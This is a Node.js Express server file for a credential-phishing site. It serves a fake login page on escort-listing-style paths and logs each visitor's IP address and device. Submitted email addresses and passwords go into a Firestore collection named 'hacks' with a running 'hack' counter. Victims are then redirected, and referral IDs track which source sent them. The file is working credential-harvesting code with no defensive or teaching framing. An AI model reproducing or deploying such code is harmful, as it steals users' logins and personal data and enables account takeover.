const express = require("express");
const engines = require("consolidate");
var useragent = require("express-useragent");
const { nanoid } = require("nanoid");
var firebase = require("firebase/app");
const {db} = require('./utility/firebase')
const {getRefId,getUserDevice,getRedirectLink} = require('./utility/functions')

const app = express();



const port = 3000;
app.engine("hbs", engines.handlebars);
app.set("views", __dirname + "/views");
app.set("view engine", "hbs");
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(useragent.express());
app.use(express.static(__dirname + "/public"));



var refId;
var defaultrefId = "uF2tIVrel1";
refId = defaultrefId;

app.get("/", (req, res) => {
  res.redirect("/auth/login");
});

app.get("/auth/login/", (req, res) => {

  let clickref = db.collection("clicks");
  let clickcountref = db.collection("calculations").doc("clicks");
  var clientIp = req.ip;
  let timeStamp = new Date().getTime();

  clickref
    .doc(timeStamp.toString())
    .set({
      hostname: req.hostname,
      base_url: "auth/login",
      ref_id: refId,
      device: getUserDevice(req.useragent),
      client_ip: clientIp,
      timestamp: timeStamp,
    })
    .then((docRef) => {
      clickcountref.update({
        all_click_count: firebase.firestore.FieldValue.increment(1),
      });
    })
    .catch((error) => {
      console.error("Error adding document: ", error);
    })
    .catch((err) => {
      console.error("Error on db action: ", err);
    });
  console.log(refId);
  res.render("login", { refId: refId });
  //TODO: get redirect with refId
});

app.get("/auth/login(/*)?", (req, res) => {
  refId = getRefId(req.originalUrl);
  res.redirect("/auth/login/");
});

app.post("/auth/login/", function (req, res) {
  var hackref = db.collection("hacks");
  var hackcountref = db.collection("calculations").doc("hacks");
  var inputData = req.body;
  var timestamp = new Date().getTime();

  inputData["timestamp"] = timestamp;
  inputData["archived"] = false;
  inputData["client_ip"] = req.ip;
  inputData["hostname"] = req.hostname;
  inputData["device"] = getUserDevice(req.useragent);
  inputData['archived']=false;
  if (
    inputData["input_account_email"].length < 25 &&
    inputData["input_account_password"].length < 16
  ) {
    hackref
      .doc(timestamp.toString())
      .set(inputData)
      .then((docRef) => {
        hackcountref.update({
          all_hack_count: firebase.firestore.FieldValue.increment(1),
        });
      })
      .catch((err) => {
        console.error("Error adding doc: ", err);
      });
  }
  // res.redirect("https://skipthegames.com");
  console.log(inputData);

  getRedirectLink(db,refId,res)
});

app.get("/female-escorts/", (req, res) => {
  res.redirect("/female-escorts/" + refId);
});

app.get("/female-escorts(/*)?", (req, res) => {
  let clickref = db.collection("clicks");
  let clickcountref = db.collection("calculations").doc("clicks");
  refId = getRefId(req.originalUrl);
  // improve on Ip
  var clientIp = req.ip;
  let timeStamp = new Date().getTime();

  clickref
    .doc(timeStamp.toString())
    .set({
      hostname: req.hostname,
      base_url: "female-escorts",
      ref_id: refId,
      device: getUserDevice(req.useragent),
      client_ip: clientIp,
      timestamp: timeStamp,
    })
    .then((docRef) => {
      clickcountref.update({
        all_click_count: firebase.firestore.FieldValue.increment(1),
      });
    })
    .catch((error) => {
      console.error("Error adding document: ", error);
    })
    .catch((err) => {
      console.error("Error on db action: ", err);
    });
  res.render("login", { refId: refId });
});
app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`);
});
